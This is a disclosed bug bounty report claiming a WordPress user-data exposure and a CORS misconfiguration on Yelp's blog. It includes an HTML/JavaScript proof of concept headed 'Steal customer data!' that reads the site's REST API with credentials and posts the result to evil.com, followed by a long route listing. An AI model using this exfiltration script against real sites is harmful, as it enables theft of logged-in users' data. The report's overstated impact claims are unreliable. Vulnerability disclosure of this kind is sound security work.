# Multiple Vulnerabilities in (*.blog.yelp.com) - Leakage user admin Sensitive Exposure

## Report Details
- **Report ID**: 779656
- **URL**: https://hackerone.com/reports/779656
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-01-21T19:04:03.458Z
- **Disclosed**: 2020-01-29T19:42:39.088Z

## Reporter
- **Username**: sourceflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
**Hi!** Team @yelp, We Found Multiple Vulnerabilities in you websites , Username Admin Login Sensitive Exposure
Refferals Hackerone [#753725]

Platform(s) Affected: [website]
*. https://blog.yelp.com/wp-json/ ``user-admin sensitive exposure``
*. https://blog.yelp.com/wp-login.php ``Admin-Page disclousure``

##Steps To Reproduce:
1) Open URL Vulnerable : https://blog.yelp.com/wp-json/
**Request**
```
GET /wp-json/ HTTP/1.1
Host: blog.yelp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://127.0.0.1:8080
DNT: 1
Connection: close
Cookie: __cfduid=dc46e8e6b98de504f3f044d1b9b3b8a191579632970
Upgrade-Insecure-Requests: 1
```
**Vulnerable Details**
Add Parameter ``Origin`` in Request Header
``Origin`` http://127.0.0.1:8080
**Exploit Cross Origin Resource Sharing Misconfiguration**
```javascript
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from blog.yelp.com about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://blog.yelp.com/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
2) save file as ``.html`` , and open in your browser
3) **Boom** Sensitive has been Exposure

**Additional information**
```javascript
	
name	"Yelp"
description	"Official Blog"
url	"https://blog.yelp.com"
home	"https://blog.yelp.com"
gmt_offset	-8
timezone_string	"America/Los_Angeles"
namespaces	[…]
authentication	[]
routes	
/	{…}
/oembed/1.0	{…}
/oembed/1.0/embed	{…}
/oembed/1.0/proxy	{…}
//wpe_sign_on_plugin/v1	{…}
/wpe_sign_on_plugin/v1/login	{…}
/redirection/v1	{…}
/redirection/v1/redirect	{…}
/redirection/v1/redirect/(?P<id>[\d]+)	{…}
/redirection/v1/bulk/redirect/(?P<bulk>delete|enable|disable|reset)	{…}
/redirection/v1/group	{…}
/redirection/v1/group/(?P<id>[\d]+)	{…}
/redirection/v1/bulk/group/(?P<bulk>delete|enable|disable)	{…}
/redirection/v1/log	{…}
/redirection/v1/bulk/log/(?P<bulk>delete)	{…}
/redirection/v1/404	{…}
/redirection/v1/bulk/404/(?P<bulk>delete)	{…}
/redirection/v1/setting	{…}
/redirection/v1/plugin	{…}
/redirection/v1/plugin/delete	{…}
/redirection/v1/plugin/test	{…}
/redirection/v1/plugin/post	{…}
/redirection/v1/plugin/database	{…}
/redirection/v1/import/file/(?P<group_id>\d+)	{…}
/redirection/v1/import/plugin	{…}
/redirection/v1/import/plugin/(?P<plugin>.*?)	{…}
/redirection/v1/export/(?P<module>1|2|3|all)/(?P<format>csv|apache|nginx|json)	{…}
/yoast/v1	{…}
/yoast/v1/configurator	{…}
/yoast/v1/reindex_posts	{…}
/yoast/v1/ryte	{…}
/yoast/v1/indexables/(?P<object_type>\w+)/(?P<object_id>\d+)	{…}
/yoast/v1/file_size	{…}
/yoast/v1/statistics	{…}
/yoast/v1/myyoast	{…}
/yoast/v1/myyoast/connect	{…}
/wp-rest-api-log	{…}
/wp-rest-api-log/entries	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)	{…}
/wp-rest-api-log/entry	{…}
/wp-rest-api-log/routes	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>body_params)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>query_params)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>body)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>request)/(?P<property>headers)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>response)/(?P<property>body)/download	{…}
/wp-rest-api-log/entry/(?P<id>[\d]+)/(?P<rr>response)/(?P<property>headers)/download	{…}
/metaslider/v1	{…}
/metaslider/v1/slideshow/all	{…}
/metaslider/v1/slideshow/preview	{…}
/metaslider/v1/slideshow/save	{…}
/metaslider/v1/slideshow/delete	{…}
/metaslider/v1/slideshow/duplicate	{…}
/metaslider/v1/themes/all	{…}
/metaslider/v1/themes/custom	{…}
/metaslider/v1/themes/set	{…}
/metaslider/v1/import/images	{…}
/metaslider/v1/tour/status	{…}
/metaslider/v1/settings/save-single	{…}
/metaslider/v1/settings/save-global	{…}
/regenerate-thumbnails/v1	{…}
/regenerate-thumbnails/v1/regenerate/(?P<id>[\d]+)	{…}
/regenerate-thumbnails/v1/attachmentinfo/(?P<id>[\d]+)	{…}
/regenerate-thumbnails/v1/featuredimages	{…}
/wp/v2	{…}
/wp/v2/posts	{…}
/wp/v2/posts/(?P<id>[\d]+)	{…}
/wp/v2/posts/(?P<parent>[\d]+)/revisions	{…}
/wp/v2/posts/(?P<parent>[\d]+)/revisions/(?P<id>[\d]+)	{…}
/wp/v2/posts/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/posts/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/pages	{…}
/wp/v2/pages/(?P<id>[\d]+)	{…}
/wp/v2/pages/(?P<parent>[\d]+)/revisions	{…}
/wp/v2/pages/(?P<parent>[\d]+)/revisions/(?P<id>[\d]+)	{…}
/wp/v2/pages/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/pages/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/media	{…}
/wp/v2/media/(?P<id>[\d]+)	{…}
/wp/v2/blocks	{…}
/wp/v2/blocks/(?P<id>[\d]+)	{…}
/wp/v2/blocks/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/blocks/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/wp-rest-api-log	{…}
/wp/v2/wp-rest-api-log/(?P<id>[\d]+)	{…}
/wp/v2/wp-rest-api-log/(?P<id>[\d]+)/autosaves	{…}
/wp/v2/wp-rest-api-log/(?P<parent>[\d]+)/autosaves/(?P<id>[\d]+)	{…}
/wp/v2/types	{…}
/wp/v2/types/(?P<type>[\w-]+)	{…}
/wp/v2/statuses	{…}
/wp/v2/statuses/(?P<status>[\w-]+)	{…}
/wp/v2/taxonomies	{…}
/wp/v2/taxonomies/(?P<taxonomy>[\w-]+)	{…}
/wp/v2/categories	{…}
/wp/v2/categories/(?P<id>[\d]+)	{…}
/wp/v2/tags	{…}
/wp/v2/tags/(?P<id>[\d]+)	{…}
/wp/v2/users	{…}
/wp/v2/users/(?P<id>[\d]+)	{…}
/wp/v2/users/me	{…}
/wp/v2/comments	{…}
/wp/v2/comments/(?P<id>[\d]+)	{…}
/wp/v2/search	{…}
/wp/v2/block-renderer/(?P<name>core/block)	{…}
/wp/v2/block-renderer/(?P<name>core/latest-comments)	{…}
/wp/v2/block-renderer/(?P<name>core/archives)	{…}
/wp/v2/block-renderer/(?P<name>core/calendar)	{…}
/wp/v2/block-renderer/(?P<name>core/categories)	{…}
/wp/v2/block-renderer/(?P<name>core/latest-posts)	{…}
/wp/v2/block-renderer/(?P<name>core/rss)	{…}
/wp/v2/block-renderer/(?P<name>core/search)	{…}
/wp/v2/block-renderer/(?P<name>core/shortcode)	{…}
/wp/v2/block-renderer/(?P<name>core/tag-cloud)	{…}
/wp/v2/settings	{…}
/wp/v2/themes	{…}
_links	{…}
```
##POC Screenshots/Videos:
  * F691740
  * F691742
  * F691741

## Impact

1. This website using Wordpress , so developer forget to disable the link that can view information of admin user. By access to this link, attacker can get all username and other information of user admin: Wordpress user admin sensitive-exposure
2. Cross Origin Resource Sharing Misconfiguration

## Attachments
- ScreenshotsYelpPOC1.png
- ScreenshotsYelpPOC.png
- ScreenshotsYelpPOC2.png
